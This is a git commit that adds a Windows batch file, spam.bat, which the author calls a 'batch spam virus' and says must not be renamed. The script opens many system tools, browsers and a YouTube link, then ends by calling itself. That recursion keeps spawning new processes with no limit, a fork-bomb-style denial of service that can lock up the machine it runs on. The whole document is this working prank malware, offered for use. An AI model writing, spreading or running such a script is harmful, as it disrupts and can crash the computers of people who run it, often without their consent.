82a28a501aef6a7089ee356ad403e49bddb21e80
leafdagamer <115121261+leafdagamer@users.noreply.github.com>
2022-11-12 22:12:38 -0300

    Added batch spam virus
    !!! DO NOT RENAME THE FILE NAME !!!

---
+++ spam.bat
@@ -0,0 +1,14 @@
+@echo off
+cls
+start appwiz.cpl
+start main.cpl
+start mspaint
+start cmd
+start notepad
+start iexplore
+start msedge
+start https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwi7-Y_4qan7AhWUpJUCHXhHDnwQwqsBegQICBAB&url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DxvFZjo5PgG0&usg=AOvVaw1bR_FN-SnfIGtKD3fjAA5P
+start cmd /C start explorer %cd%
+start iexpress
+start write
+spam.bat
